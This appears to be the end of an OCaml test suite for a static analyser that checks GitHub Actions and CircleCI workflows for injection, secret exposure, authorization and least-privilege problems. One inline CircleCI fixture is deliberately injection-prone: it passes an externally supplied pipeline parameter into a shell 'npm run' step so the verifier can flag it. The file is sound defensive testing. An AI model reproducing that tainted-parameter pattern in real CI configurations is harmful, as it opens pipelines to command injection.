            (Printf.sprintf "%s and %s retain their total-order positions"
               (Property.state_name left) (Property.state_name right))
            (Int.compare actual 0 = Int.compare left_index right_index))
        states)
    states;
  expect "subjects are a stable comparison discriminator"
    (Property.compare
       (property ~subject:(Some "a") Property.Proved)
       (property ~subject:(Some "b") Property.Proved)
    < 0)

let correctness_evidence_test () =
  let compile = node ~kind:Ir.Parameter ~phase:Ir.Compile "compile value"
  and runtime = node ~kind:Ir.Command ~phase:Ir.Run "runtime value" in
  let result =
    graph [ compile; runtime ] [ edge ~kind:Ir.Data runtime compile ] [ runtime ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  match
    List.find_opt
      (fun diagnostic -> diagnostic.Diagnostic.rule_id = "WV-CORRECT-001")
      result.diagnostics
  with
  | Some diagnostic ->
      expect "correctness diagnostics retain the machine issue code"
        (List.mem "IR-PHASE-ORDER" diagnostic.evidence)
  | None -> fail "phase-order violation did not produce a correctness diagnostic"

let local_reference_suffix_test () =
  let call = node ~kind:Ir.Call "./actions/build@deadbeef"
  and entry = node ~kind:Ir.Step "local action entry" in
  let caller =
    Ir.empty Ir.Github ".github/workflows/ci.yml" |> Ir.add_node call
    |> Ir.add_entrypoint call.id |> Ir.finalize
  and target =
    Ir.empty Ir.Github "actions/build/action.yml" |> Ir.add_node entry
    |> Ir.add_entrypoint entry.id |> Ir.finalize
  in
  let program = Program_graph.compose [ caller; target ] in
  expect "a local call suffix is stripped before target matching"
    (List.exists
       (fun (edge : Ir.edge) ->
         edge.kind = Ir.Call_edge && edge.from_ = call.id && edge.to_ = entry.id)
       program.edges);
  let yaml_call = node ~kind:Ir.Call "actions/reusable.yaml@deadbeef"
  and yaml_entry = node ~kind:Ir.Workflow "YAML reusable entry" in
  let yaml_caller =
    Ir.empty Ir.Github ".github/workflows/release.yml" |> Ir.add_node yaml_call
    |> Ir.add_entrypoint yaml_call.id |> Ir.finalize
  and yaml_target =
    Ir.empty Ir.Github "actions/reusable.yaml" |> Ir.add_node yaml_entry
    |> Ir.add_entrypoint yaml_entry.id |> Ir.finalize
  in
  let yaml_program = Program_graph.compose [ yaml_caller; yaml_target ] in
  expect "a bare .yaml reference links as a local workflow"
    (List.exists
       (fun (edge : Ir.edge) ->
         edge.kind = Ir.Call_edge && edge.from_ = yaml_call.id
         && edge.to_ = yaml_entry.id)
       yaml_program.edges);
  let self_call = node ~kind:Ir.Call "workflows/self.yml"
  and self_entry = node ~kind:Ir.Workflow "self entry" in
  let self_graph =
    Ir.empty Ir.Github "workflows/self.yml" |> Ir.add_node self_call
    |> Ir.add_node self_entry |> Ir.add_entrypoint self_entry.id |> Ir.finalize
  in
  let self_program = Program_graph.compose [ self_graph ] in
  expect "a local unit never creates a recursive call edge to itself"
    (not
       (List.exists
          (fun (edge : Ir.edge) ->
            edge.kind = Ir.Call_edge && edge.from_ = self_call.id)
          self_program.edges))

let github_end_to_end_test () =
  let path = Filename.concat (Sys.getcwd ()) "fixtures/github/workflow.yml" in
  let source =
    match Util.read_file path with
    | Ok value -> value
    | Error error -> fail "%s" error
  in
  let compilation =
    match Frontend.compile_string ~provider:Ir.Github ~path ~source () with
    | Ok value -> value
    | Error _ -> fail "GitHub fixture did not compile"
  in
  let result = Verifier.verify ~persona:Verifier.Gate compilation.graph in
  List.iter
    (fun rule -> expect ("end-to-end missing " ^ rule) (has_rule rule result))
    [ "WV-SEC-001"; "WV-SEC-002"; "WV-SUPPLY-001" ];
  expect "unresolved action demand does not create a false permission finding"
    (not (has_rule "WV-PERM-001" result));
  expect "unresolved action demand keeps least privilege Unknown"
    (match (property "WV-PERM-001" result).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false)

let protected_release_dominance_test () =
  let attestation_revision = String.make 40 'a' in
  let source =
    {|
on:
  push:
    tags: [v1.0.0]
jobs:
  publish:
    if: github.ref_protected == true
    environment: release
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      attestations: write
      artifact-metadata: write
    steps:
      - uses: actions/attest@|}
    ^ attestation_revision
    ^ {|
        with:
          subject-checksums: dist/SHA256SUMS
      - run: gh release create "$GITHUB_REF_NAME" dist/*
|}
  in
  let compilation =
    match
      Frontend.compile_string ~provider:Ir.Github
        ~path:".github/workflows/release.yml" ~source ()
    with
    | Ok value -> value
    | Error _ -> fail "protected release fixture did not compile"
  in
  let result = Verifier.verify ~persona:Verifier.Gate compilation.graph in
  expect "a trusted protected-ref gate dominates the release effect"
    ((property "WV-AUTH-001" result).state = Property.Proved);
  expect "the environment grant is not a second deployment effect"
    (not (has_rule "WV-AUTH-001" result));
  expect "attestation grants are consumed by the attestation effect"
    (not (has_rule "WV-PERM-001" result))

let circleci_parameter_binding_test () =
  let verify source =
    match
      Frontend.compile_string ~provider:Ir.Circleci ~path:".circleci/config.yml"
        ~source ()
    with
    | Ok compilation -> Verifier.verify ~persona:Verifier.Gate compilation.graph
    | Error _ -> fail "CircleCI parameter fixture did not compile"
  in
  let safe =
    verify
      {|version: 2.1
jobs:
  test:
    parameters:
      target:
        type: string
        default: unit
    docker: [{image: cimg/base:current}]
    steps:
      - run: npm run << parameters.target >>
workflows:
  checks:
    jobs:
      - test:
          target: integration
|}
  in
  expect "version-controlled job parameter values are trusted shell inputs"
    (not (has_rule "WV-SEC-001" safe));
  let unsafe =
    verify
      {|version: 2.1
parameters:
  target:
    type: string
    default: unit
jobs:
  test:
    parameters:
      target:
        type: string
    docker: [{image: cimg/base:current}]
    steps:
      - run: npm run << parameters.target >>
workflows:
  checks:
    jobs:
      - test:
          target: << pipeline.parameters.target >>
|}
  in
  expect "an externally supplied pipeline parameter taints its job binding"
    (has_rule "WV-SEC-001" unsafe)

let tests : test list =
  [
    ("injection has violated proved and unknown states", injection_triple_test);
    ( "injection correlates taint with environment quote boundaries",
      injection_environment_binding_test );
    ("secret to network yields minimal capabilities", secret_network_test);
    ( "secret observability distinguishes redirects and unknown calls",
      secret_observability_boundaries_test );
    ( "unknown secrecy remains explicit at an observable network effect",
      unknown_secret_network_effect_test );
    ( "network-capable sink uncertainty remains explicit",
      network_capability_uncertainty_test );
    ("authorization gates must dominate privileged effects", dominance_test);
    ( "authorization distinguishes external Unknown and manual approval",
      authorization_unknown_and_manual_test );
    ( "supply chain and least privilege share the graph",
      supply_chain_and_permission_test );
    ( "least privilege diagnoses only closed excessive grants",
      known_excessive_permission_test );
    ( "least privilege reads the canonical command source",
      command_attribute_consumes_permission_test );
    ( "inherent execution capabilities are not reducible grants",
      inherent_execution_capabilities_are_not_reducible_grants_test );
    ("script adapters infer effects and quote boundaries", script_adapter_test);
    ( "capability demand follows reachable effects only",
      disconnected_capability_demand_test );
    ("dynamic gate mechanisms are not authorization", dynamic_gate_mechanism_test);
    ( "credential candidates follow their own persistence edges",
      credential_candidate_boundaries_test );
    ("graph algorithms preserve path boundaries", graph_algorithm_boundaries_test);
    ("dataflow evidence has canonical node ordering", dataflow_order_test);
    ("property proof states have a total order", property_order_test);
    ("correctness diagnostics retain issue evidence", correctness_evidence_test);
    ("local call references strip immutable suffixes", local_reference_suffix_test);
    ( "GitHub frontend feeds whole-program security analysis",
      github_end_to_end_test );
    ( "protected release ref dominates deployment and repository effects",
      protected_release_dominance_test );
    ( "CircleCI parameter bindings preserve trust across workflow calls",
      circleci_parameter_binding_test );
  ]

let () =
  let failures = ref 0 in
  List.iter
    (fun (name, run) ->
      try
        run ();
        Printf.printf "ok - %s\n%!" name
      with
      | Failed message ->
          incr failures;
          Printf.eprintf "not ok - %s: %s\n%!" name message
      | error ->
          incr failures;
          Printf.eprintf "not ok - %s: unexpected %s\n%!" name
            (Printexc.to_string error))
    tests;
  if !failures > 0 then exit 1
